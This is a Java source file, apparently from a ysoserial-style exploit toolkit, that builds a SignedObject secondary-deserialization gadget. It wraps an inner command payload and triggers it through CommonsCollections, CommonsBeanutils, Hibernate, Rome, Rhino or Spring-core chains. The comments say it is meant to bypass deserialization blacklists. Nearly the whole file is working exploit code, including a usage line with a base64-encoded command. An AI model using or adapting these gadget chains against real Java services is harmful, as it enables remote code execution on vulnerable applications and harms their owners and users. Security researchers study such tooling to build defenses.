package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.payloads.gadgets.jdk.GHashMap;
import com.sun.syndication.feed.impl.ObjectBean;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.mozilla.javascript.*;
import org.mozilla.javascript.tools.shell.Environment;
import org.springframework.beans.factory.ObjectFactory;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.Reflections;

import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.*;
import java.math.BigInteger;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.Signature;
import java.util.*;

import static java.lang.Class.forName;
import static com.h2tg.ysogate.utils.MiscUtils.base64Decode;

/**
 * SignedObject 二次反序列化 Gadget，用来进行某些场景的绕过（常见如 TemplatesImpl 黑名单，CTF 中常出现的 CC 无数组加黑名单等）
 * 利用链需要调用 SignedObject 的 getObject 方法，因此需要可以调用任意方法、或调用指定类 getter 方法的触发点；
 * yso 中大概包含如下几种可用的常见调用链：
 * 1. InvokerTransformer 调用任意方法（依赖 CC）
 * 2. BeanComparator 调用 getter 方法（依赖 CB）
 * 3. BasicPropertyAccessor$BasicGetter 调用 getter 方法(依赖 Hibernate)
 * 4. MemberBox 反射调用任意方法（依赖 rhino）
 * 5. ToStringBean 调用全部 getter 方法（依赖 Rome）
 * 6. MethodInvokeTypeProvider 反射调用任意方法（依赖 spring-core）
 * <p>
 * 利用方式：
 * -g SignedObject -p 'CC:CommonsCollections6:b3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==:1:10000' -dt 1 -dl 20000
 *
 * @author su18
 */
public class SignedObject implements CommandObjectPayload<Object>
{

	@Override
	public Object getObject(String command) throws Exception {

		String[] commands = command.split(":");

		if (commands.length < 3) {
			throw new IllegalArgumentException("Command format is: <Type>:<Original_Type>:<Command_Base64>:<Dirty_Type>:<Dirty_Length>");
		}

		String type   = commands[0].toLowerCase();
		Object object = getOriginal(Arrays.copyOfRange(commands, 1, commands.length));

		if ("cb".equals(type)) {
			return getSignedObjectWithCB(object);
		} else if ("hibernate".equals(type)) {
			return getSignedObjectWithHibernate(object);
		} else if ("rome".equals(type)) {
			return getSignedObjectWithRome(object);
		} else if ("rhino".equals(type)) {
			return getSignedObjectWithRhino(object);
		} else if ("spring".equals(type)) {
			return getSignedObjectWithSpring(object);
		} else if ("cc4".equals(type)) {
			return getSignedObjectWithCC4(object);
		} else {
			return getSignedObjectWithCCNoArray(object);
		}

	}


	public Object getOriginal(String[] args) throws Exception {
		final String payloadType = args[0];
		String       command     = args[1];

		// 支持单双引号
		if (command.startsWith("'") || command.startsWith("\"")) {
			command = command.substring(1, command.length() - 1);
		}

		String realCmd = base64Decode(command);

		final Class<? extends CommandObjectPayload> payloadClass = CommandObjectPayload.Utils.getPayloadClass(payloadType);
		CommandObjectPayload payload      = payloadClass.newInstance();
		Object                               object       = payload.getObject(realCmd);

//		if (args.length >= 3) {
//			final String type   = args[2];
//			final String length = args[3];
//			object = (new DirtyDataWrapper(object, Integer.parseInt(type), Integer.parseInt(length))).doWrap();
//		}

		return object;
	}


	// CC 无数组二次反序列化
	public Object getSignedObjectWithCCNoArray(Object serObj) throws Exception {
		Object obj = warpWithSignedObject((Serializable) serObj);

		Map          old    = new HashMap();
		Transformer  invoke = new InvokerTransformer("toString", null, null);
		Map          newMap = LazyMap.decorate(old, invoke);
		TiedMapEntry entry  = new TiedMapEntry(newMap, obj);
		Map          ht     = new HashMap();
		ht.put(entry, obj);
		newMap.remove(obj);

		Reflections.setFieldValue(invoke, "iMethodName", "getObject");
		return ht;
	}

	// CC4 无 TiedMapEntry 二次反序列化
	public Object getSignedObjectWithCC4(Object serObj) throws Exception {
		Object obj = warpWithSignedObject((Serializable) serObj);

		org.apache.commons.collections4.functors.InvokerTransformer transformer = new org.apache.commons.collections4.functors.InvokerTransformer("toString", new Class[0], new Object[0]);
		TransformingComparator                                      comp        = new TransformingComparator((org.apache.commons.collections4.Transformer) transformer);
		TreeBag                                                     tree        = new TreeBag((Comparator) comp);
		tree.add(obj);
		Reflections.setFieldValue(transformer, "iMethodName", "getObject");
		return tree;
	}


	// CB 二次反序列化
	public Object getSignedObjectWithCB(Object serObj) throws Exception {
		Object obj = warpWithSignedObject((Serializable) serObj);

		final BeanComparator        comparator = new BeanComparator("lowestSetBit");
		final PriorityQueue<Object> queue      = new PriorityQueue<Object>(2, comparator);
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		Reflections.setFieldValue(comparator, "property", "object");
		Reflections.setFieldValue(queue, "queue", new Object[]{obj, obj});
		return queue;
	}

	// Hibernate 二次反序列化
	public Object getSignedObjectWithHibernate(Object serObj) throws Exception {
		Object obj     = warpWithSignedObject((Serializable) serObj);
		Object getters = Hibernate1.makeGetter(obj.getClass(), "getObject");
		return Hibernate1.makeCaller(obj, getters);
	}


	// Rome 二次反序列化
	public Object getSignedObjectWithRome(Object serObj) throws Exception {
		Object     obj      = warpWithSignedObject((Serializable) serObj);
		ObjectBean delegate = new ObjectBean(java.security.SignedObject.class, obj);
		ObjectBean root     = new ObjectBean(ObjectBean.class, delegate);
		GHashMap gHashMap = new GHashMap();
		return gHashMap.readObject2HashCode(root, root);
//		return Gadgets.makeMap(root, root);
	}


	// Rhino 二次反序列化
	public Object getSignedObjectWithRhino(Object serObj) throws Exception {
		Object              obj              = warpWithSignedObject((Serializable) serObj);
		ScriptableObject    dummyScope       = new Environment();
		Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
		associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
		Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);
		Object           initContextMemberBox        = Reflections.createWithConstructor(Class.forName("org.mozilla.javascript.MemberBox"), (Class<Object>) Class.forName("org.mozilla.javascript.MemberBox"), new Class[]{Method.class}, new Object[]{Context.class.getMethod("enter")});
		ScriptableObject initContextScriptableObject = new Environment();
		Method           makeSlot                    = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
		Reflections.setAccessible(makeSlot);
		Object slot = makeSlot.invoke(initContextScriptableObject, "su18", 0, 4);
		Reflections.setFieldValue(slot, "getter", initContextMemberBox);
		NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();
		Reflections.setFieldValue(initContextNativeJavaObject, "parent", dummyScope);
		Reflections.setFieldValue(initContextNativeJavaObject, "isAdapter", true);
		Reflections.setFieldValue(initContextNativeJavaObject, "adapter_writeAdapterObject", this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
		Reflections.setFieldValue(initContextNativeJavaObject, "javaObject", initContextScriptableObject);
		ScriptableObject scriptableObject = new Environment();
		scriptableObject.setParentScope(initContextNativeJavaObject);
		makeSlot.invoke(scriptableObject, "object", 0, 2);
		NativeJavaArray nativeJavaArray = Reflections.createWithoutConstructor(NativeJavaArray.class);
		Reflections.setFieldValue(nativeJavaArray, "parent", dummyScope);
		Reflections.setFieldValue(nativeJavaArray, "javaObject", obj);
		nativeJavaArray.setPrototype(scriptableObject);
		Reflections.setFieldValue(nativeJavaArray, "prototype", scriptableObject);
		NativeJavaObject nativeJavaObject = new NativeJavaObject();
		Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);
		Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
		Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject",
				this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
		Reflections.setFieldValue(nativeJavaObject, "javaObject", nativeJavaArray);

		return nativeJavaObject;
	}


	// Spring-Core 二次反序列化
	public Object getSignedObjectWithSpring(Object serObj) throws Exception {
		Object        obj                = warpWithSignedObject((Serializable) serObj);
		ObjectFactory objectFactoryProxy = Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", obj), ObjectFactory.class);
		Type          typeTemplatesProxy = Gadgets.createProxy((InvocationHandler) Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").newInstance(objectFactoryProxy), Type.class, java.security.SignedObject.class);
		Object        typeProviderProxy  = Gadgets.createMemoitizedProxy(Gadgets.createMap("getType", typeTemplatesProxy), forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"));

		final Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
		final Object      mitp     = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass", new Class[]{}), 0);
		Reflections.setFieldValue(mitp, "methodName", "getObject");
		return mitp;
	}

	public static java.security.SignedObject warpWithSignedObject(Serializable obj) throws Exception {
		KeyPairGenerator keyPairGenerator;
		keyPairGenerator = KeyPairGenerator.getInstance("DSA");
		keyPairGenerator.initialize(1024);
		KeyPair    keyPair       = keyPairGenerator.genKeyPair();
		PrivateKey privateKey    = keyPair.getPrivate();
		Signature  signingEngine = Signature.getInstance("DSA");
		return new java.security.SignedObject(obj, privateKey, signingEngine);
	}
}
